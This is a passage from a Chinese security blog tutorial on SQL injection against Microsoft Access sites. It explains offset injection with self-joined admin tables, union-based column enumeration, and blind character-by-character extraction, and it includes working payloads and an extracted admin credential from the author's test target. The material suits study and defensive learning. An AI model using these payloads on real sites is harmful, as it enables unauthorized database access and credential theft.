<li>原因就是，由于admin表进行了一次自连接，使得payload中from关键字后面的表由原有的 “admin表” 变成了：由“先让admin自己做笛卡尔积然后挑选id值相等的记录”组成的表。这样的话，payload中的“ * ”就由原来所代表的 “admin表” 中的6个字段，变为了现在所代表的 “admin自连接表” 的12个字段，又由于union关键字的使用，要求union关键字后面select查询的字段数必须要等于前面select查询的字段数，所以union关键字后面的select中用于充数的字段由原来的22-6=16变为了22-12=10个字段，因此由于充数的字段变少了，那么admin表的数据自然的就可以向前移动了。</li>
<li>请注意：admin表中的数据向前移动的字段数只能是admin表（即目标表）字段数的整数倍（这是由表自连接的特性所决定的）。</li>
</ul>
</li>
</ul>
<p>但这里我的admin表似乎数据不对劲，只有一组数据，怪不得我一直搞不懂上述操作的原理 （我还以为是我傻）。。。。</p>
<p>不过仔细阅读参考文章，我认为这里进行笛卡尔积的操作之后是将同id（6个字段）连接了起来而形成12个字段的“新表”</p>
<p>附上图片：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009204134962.png" alt="image-20231009204134962"></p>
<ul>
<li>
<p>在此我们已经爆出了admin表的密码，</p>
</li>
<li>
<p>此时，其实admin表的admin字段就紧挨在password字段的前方（其实在实战环境中我们是不确定admin字段是在前还是在后的，此处只是为了方便原理的讲解，就直接告诉你了）</p>
</li>
<li>
<p>那么我们是否仍然可以将数据向前移动而爆出admin字段的值呢？在这里显然是不行的，因为我们只能向前移动admin表的字段数量的整数倍（在这里即是6的整数倍），而此时admin表的admin字段此时所处字段为12号字段，再向前移动6个字段的话，admin字段就处于6号字段处了，仍然没有与显示位的位置发生重合。</p>
</li>
<li>
<p><strong>到了这里，细心的同学会发现：</strong></p>
<ul>
<li>之前我们讲的都是如何将admin表中的数据向前移动，那么我们可不可以使得数据向后移动呢？要是可以向后移动的话，紧接着2级偏移，然后让数据向后移动一个字段，不就正好让admin字段处于13号显示位了吗？</li>
<li>恭喜你！你的想法是对的，我们的确可以让admin表的数据向后移动，不过遗憾的是，向后移动的字段数仍然取决于：我们能够猜解出admin表中多少个字段名。若猜解出1个字段名，那么我们就可以让数据向后移动1个字段数，若猜解出2个字段名，那么我们就可以让数据向后移动2个字段数，以此类推。（不过这里所需要猜解的字段名不需要是我们想要查找的字段名，只要是admin表中的字段名均可），原因请继续往后阅读：</li>
</ul>
</li>
<li>
<p><strong>微调payload：</strong></p>
</li>
</ul>
<pre><code class="hljs plaintext">?id=1513 union select top 1 1,2,3,4,5,6,7,8,9,10,b.id, * from (admin a inner join admin b on a.id=b.id)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009204617629.png" alt="image-20231009204617629"></p>
<ul>
<li>根据页面返回的数据，我们可以看到，在第13号显示位我们成功的爆出了admin字段的第一个值:admin</li>
<li>原因：
<ul>
<li>我们先观察sql语句，发现union关键字后面的select查询的填充字段多了代码“<a target="_blank" rel="noopener" href="http://b.id">b.id</a>”，意思是在此输出b表（admin表的别名之一）的id字段值，由于此处已经显式的指出id字段值的输出位置，那么后面的 “ * ” 就会自动的识别，就只输出admin自联表剩下的字段值了，从而使得剩余数据均向后移动了一个字段，让原本在13号字段的admin字段向后移动了1位，到了13号显示位上了。</li>
<li>但请注意：此处的id字段名是我们已经猜解出的</li>
<li>这也就回答了上述所说的：“向后移动的字段数仍然取决于：我们能够猜解出admin表中多少个字段名，不过这里所需要猜解的字段名不需要必须是我们想要查找的字段名，只要是admin表中的字段名均可”。因此，如果我们想让admin数据向后移动2个字段值，那么我们就需要知道除了id字段名外，其他任一字段名即可，然后构造如下payload：?id=1513 union select top 1 1,2,3,4,5,6,7,8,9,10,<a target="_blank" rel="noopener" href="http://b.id">b.id</a>,b.字段名 * from (admin a inner join admin b on <a target="_blank" rel="noopener" href="http://a.id=b.id">a.id=b.id</a>)</li>
</ul>
</li>
</ul>
<p>附上图片：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231009204943163.png" alt="image-20231009204943163"></p>
<h1 id="0x05-总结">0x05 总结</h1>
<p>这里依旧cv了一下那篇参考文章(┭┮﹏┭┮太菜了,没自己的想法)</p>
<ul>
<li>至此，整个测试已结束，我们成功的爆出了 账号与密码：admin/a48e190faf</li>
<li>接下来我会依次提出几个问题，然后一一进行解答：
<ol>
<li>如果我们仍然采用上述环境，那可不可以进行3级偏移和四级偏移呢？
<ul>
<li>答：3级偏移可以，但是4级偏移不行，因为如果进行4级偏移的话，就会使得偏移注入基本公式：<strong>联合查询补充字段数=当前字段数量-目标表的字段数 x 4 ==&gt; 22-6x4=-2&lt;0</strong>，即：会造成union关键字之前的select查询字段数的数量 &lt; union关键字之后的字段数量，从而导致查询失败。</li>
<li>3级偏移的payload：<strong>?id=1513 union select top 1 1,2,3,4, * from((admin as a inner join admin as b on <a target="_blank" rel="noopener" href="http://a.id=b.id">a.id=b.id</a>) inner join admin as c on <a target="_blank" rel="noopener" href="http://a.id=c.id">a.id=c.id</a>)</strong></li>
</ul>
</li>
<li>access偏移注入是否是真的随机？
<ul>
<li>通过上述原理的讲解，这个问题也就不攻自破了，显然access注入并不是真正的随机，并不是完全不受我们控制的，在我们获取足够信息的情况下（“目标表”的字段数量，当前字段数量，已知的“目标表字段名"的数量），我们可以在一定范围内完全控制显示位处的数据显示，而之所以说是一定范围内，只是因为 “显示位的位置” 和 “我们可以猜解到的目标表字段名的数量” 这两个因素不是我们可以控制的。</li>
</ul>
</li>
<li>是否可以只说：“当前表”的字段数越多成功率越大，或“目标表”的字段数越少成功率越大？
<ul>
<li>显然我们不能这样简单的得出结论，偏移注入是否能够成功，取决于：“显示位位置” 和 “目标字段能够移动到的位置” 是否可以重合，如果可以重合的话，即使“当前表”字段数小一点，“目标表”字段数多一点也是无妨的（但万万不可“当前表”的字段数量 &lt; “目标表”的字段数量）</li>
</ul>
</li>
<li>是什么决定着“目标表”的数据一次性前移的字段数？是什么决定着“目标表”的数据可以后移的字段数？
<ul>
<li>前者是由 <strong>“目标表的字段数量”</strong> 所决定的：目标表中的数据 向前移动的字段数 只能是 目标表中的字段数的整数倍（这是由表自连接的特性所决定的）。</li>
<li>后者是由 <strong>“我们可以猜解得到的目标表的字段名数量”</strong> 所决定。若猜解出1个字段名，那么我们就可以让数据向后移动1个字段数，若猜解出2个字段名，那么我们就可以让数据向后移动2个字段数，以此类推。（不过这里所需要猜解的字段名不需要必须是我们想要查找的字段名，只要是admin表中的字段名均可）</li>
</ul>
</li>
</ol>
</li>
</ul>
<p>可以看到上述的三级偏移是进行了两次笛卡尔积的操作</p>
<p>不得不说这个偏移注入真的厉害，真有一种黑客的感觉</p>
<p>这里顺便总结比较一下联合注入和逐字猜解语句</p>
<h2 id="51-联合注入">5.1 联合注入</h2>
<p>先是判断是否存在注入，这里就不赘述了</p>
<h3 id="511-判断字段数">5.1.1 判断字段数</h3>
<pre><code class="hljs plaintext">?id=1513 order by 22 #页面正常
?id=1513 order by 23 #页面报错</code></pre>
<p>说明当前表的字段数为16</p>
<h3 id="512-爆出回显位">5.1.2 爆出回显位</h3>
<pre><code class="hljs plaintext">?id=1513 union select 字段数 from 正确表名
随机查看页面或者源代码看那些字段是可以回显的</code></pre>
<h3 id="513-猜测表名">5.1.3 猜测表名</h3>
<pre><code class="hljs plaintext">?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin ——猜表名（报错说明表名不存在，将admin换成别的继续猜）</code></pre>
<h3 id="514-猜测列名">5.1.4 猜测列名</h3>
<pre><code class="hljs plaintext">?id=1513 union select 1,2,username,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin ——猜列名（列名位置放置页面上显示的数字位置上）（报错说明列名不存在，换列明继续猜）（列名猜对后及出账号密码）</code></pre>
<h2 id="52-逐字猜解法">5.2 逐字猜解法</h2>
<p>先是判断是否存在注入，也不赘述</p>
<h3 id="521-猜测表名">5.2.1 猜测表名</h3>
<pre><code class="hljs plaintext">?id=1513 and exists (select * from admin) ——猜表名
页面正常即猜测正确</code></pre>
<h3 id="522-猜测列名">5.2.2 猜测列名</h3>
<pre><code class="hljs plaintext">?id=1513 and exists (select user_name from admin) ——猜列名
页面正常即猜测正确</code></pre>
<h3 id="523-爆数据">5.2.3 爆数据</h3>
<p>1.确定长度 2.确定asc数据(asc编码)</p>
<pre><code class="hljs plaintext">?id=1513 and (select top 1 len(user_name ) from admin)=5(user_name 的长度=5，正常则=5，也可以用&gt;,&lt;号去判断）

?id=1513 and (select top 1 asc(mid(user_name ,1,1)) from admin)=97 判断第一位（97代表‘a’的ascll值）

?id=1513 and (select top 1 asc(mid(user_name ,2,1)) from admin)=97 判断第二位

（user_name =admin 第一位a 第二位d 第三位m 第四位i 第五位n pass_word=a48e190fafc257d3）</code></pre>
<p>更多骚操作就不赘述了，日后碰到的话在找，这里主要就是了解数据库的特性以及常规语句。</p>
<p>现在存在Access数据库的网站越来越少了，一般都是一些小型站或是老站，相对来说参考价值较低。而随着新型数据库的兴起，慢慢地Access数据库也会卷入时代的浪潮里而消失。但怎样有效地防范SQL注入、提升网络安全意识却是个长久的议题。</p>
<h1 id="0x06-参考文章">0x06 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/02SWD/p/15811580.html">[access偏移注入原理]</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011781521/article/details/53942183">SQL注入系列之ASP+ACCESS手动注入(一)----数字型</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/284283.html">SQL注入之Access数据库</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/10/08/sql-zhu-ru-zhi-access-shu-ju-ku/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/10/08/sql-zhu-ru-zhi-access-shu-ju-ku/')">SQL注入之Access篇</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2023/10/08/sql-zhu-ru-zhi-access-shu-ju-ku/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=SQL注入之Access篇&amp;url=http://hybcx.xyz/2023/10/08/sql-zhu-ru-zhi-access-shu-ju-ku/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/10/05/wtf.sh-150/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">wtf.sh-150</div></div></a></div><div class="next-post pull-right"><a href="/2023/10/12/newstarctf-2023/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">NewStarCTF 2023</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%A6%82%E6%8B%AC"><span class="toc-number">2.</span> <span class="toc-text">0x02 概括</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">0x03 注入思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">0x04 注入方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#41-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 联合注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#42-%E9%80%90%E5%AD%97%E7%8C%9C%E8%A7%A3"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 逐字猜解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#43-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 偏移注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#431-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">4.3.1.</span> <span class="toc-text">4.3.1 注入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#432-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">4.3.2.</span> <span class="toc-text">4.3.2 判断是否存在注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#433-%E5%88%A4%E6%96%AD%E5%BD%93%E5%89%8D%E5%AD%97%E6%AE%B5%E6%95%B0%E9%87%8F"><span class="toc-number">4.3.3.</span> <span class="toc-text">4.3.3  判断当前字段数量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#434-%E7%8C%9C%E6%B5%8B%E5%BD%93%E5%89%8D%E8%A1%A8%E7%9A%84%E8%A1%A8%E5%90%8D"><span class="toc-number">4.3.4.</span> <span class="toc-text">4.3.4 猜测当前表的表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#435-%E7%A1%AE%E5%AE%9A%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-number">4.3.5.</span> <span class="toc-text">4.3.5 确定回显位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#436-%E7%A1%AE%E5%AE%9A%E7%9B%AE%E6%A0%87%E8%A1%A8%E7%9A%84%E5%AD%97%E6%AE%B5%E6%95%B0%E9%87%8F"><span class="toc-number">4.3.6.</span> <span class="toc-text">4.3.6 确定目标表的字段数量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#437-%E8%BF%9B%E8%A1%8C%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.7.</span> <span class="toc-text">4.3.7 进行偏移注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">0x05 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#51-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">5.1.</span> <span class="toc-text">5.1 联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#511-%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">5.1.1.</span> <span class="toc-text">5.1.1 判断字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#512-%E7%88%86%E5%87%BA%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-number">5.1.2.</span> <span class="toc-text">5.1.2 爆出回显位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#513-%E7%8C%9C%E6%B5%8B%E8%A1%A8%E5%90%8D"><span class="toc-number">5.1.3.</span> <span class="toc-text">5.1.3 猜测表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#514-%E7%8C%9C%E6%B5%8B%E5%88%97%E5%90%8D"><span class="toc-number">5.1.4.</span> <span class="toc-text">5.1.4 猜测列名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#52-%E9%80%90%E5%AD%97%E7%8C%9C%E8%A7%A3%E6%B3%95"><span class="toc-number">5.2.</span> <span class="toc-text">5.2 逐字猜解法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#521-%E7%8C%9C%E6%B5%8B%E8%A1%A8%E5%90%8D"><span class="toc-number">5.2.1.</span> <span class="toc-text">5.2.1 猜测表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#522-%E7%8C%9C%E6%B5%8B%E5%88%97%E5%90%8D"><span class="toc-number">5.2.2.</span> <span class="toc-text">5.2.2 猜测列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#523-%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-number">5.2.3.</span> <span class="toc-text">5.2.3 爆数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">6.</span> <span class="toc-text">0x06 参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-yun-xing-shi-gui-bi-jian-ce/" title="THM-运行时规避检测">THM-运行时规避检测</a><time datetime="2024-08-08T14:19:16.000Z" title="发表于 2024-08-08 22:19:16">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC">THM-ByPass_UAC</a><time datetime="2024-08-08T07:36:41.000Z" title="发表于 2024-08-08 15:36:41">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/07/thm-qian-ming-gui-bi/" title="THM-签名规避">THM-签名规避</a><time datetime="2024-08-07T09:11:33.000Z" title="发表于 2024-08-07 17:11:33">2024-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/05/windows-ti-quan-zong-jie/" title="Windows提权总结">Windows提权总结</a><time datetime="2024-08-05T02:59:37.000Z" title="发表于 2024-08-05 10:59:37">2024-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/02/thm-dai-ma-hun-yao-yuan-li/" title="THM-代码混淆原理">THM-代码混淆原理</a><time datetime="2024-08-02T01:46:10.000Z" title="发表于 2024-08-02 09:46:10">2024-08-02</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">199</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" 